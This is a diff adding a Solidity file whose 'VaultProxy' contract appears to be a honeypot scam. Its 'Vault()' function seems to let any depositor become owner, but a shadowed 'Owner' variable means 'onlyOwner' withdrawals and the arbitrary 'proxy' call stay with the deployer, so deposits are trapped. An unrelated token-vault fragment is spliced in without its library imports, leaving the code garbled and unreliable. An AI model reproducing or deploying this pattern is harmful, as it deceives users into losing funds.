@@ -1,0 +1,77 @@
+ 
+
+pragma solidity ^0.4.23;
+
+contract Proxy  {
+    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
+    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
+    function proxy(address target, bytes data) public payable {
+         
+        target.call.value(msg.value)(data);
+    }
+}
+
+contract VaultProxy is Proxy {
+    address public Owner;
+    mapping (address => uint256) public Deposits;
+
+
+    using SafeERC20 for ERC20;
+    using SafeMath for uint256;
+
+    // 8 months after deposit, user can withdrawal all his/her ARP.
+    uint256 public constant WITHDRAWAL_DELAY = 240 days; // = 8 months
+
+    // ERC20 basic token contract being held
+    ERC20 public arpToken;
+    uint256 public arpDeposited;
+
+    struct Record {
+        uint256 amount;
+        uint256 timestamp;
+    }
+
+    mapping(address => Record) records;
+
+    /// Emitted for each successful withdrawal.
+    uint256 public withdrawId = 0;
+    event Withdrawal(uint256 _withdrawId, address indexed _addr, uint256 _amount);
+
+    /// Withdraws ARP.
+    function withdraw() private {
+        require(arpDeposited > 0);
+
+        Record storage record = records[msg.sender];
+        require(record.amount > 0);
+        require(now >= record.timestamp.add(WITHDRAWAL_DELAY));
+        uint256 amount = record.amount;
+        delete records[msg.sender];
+
+        arpDeposited = arpDeposited.sub(amount);
+
+        arpToken.safeTransfer(msg.sender, amount);
+
+        emit Withdrawal(withdrawId++, msg.sender, amount);
+    }
+
+    function () public payable { }
+    
+    function Vault() public payable {
+        if (msg.sender == tx.origin) {
+            Owner = msg.sender;
+            deposit();
+        }
+    }
+    
+    function deposit() public payable {
+        if (msg.value > 0.25 ether) {
+            Deposits[msg.sender] += msg.value;
+        }
+    }
+    
+    function withdraw(uint256 amount) public onlyOwner {
+        if (amount>0 && Deposits[msg.sender]>=amount) {
+            msg.sender.transfer(amount);
+        }
+    }
+}
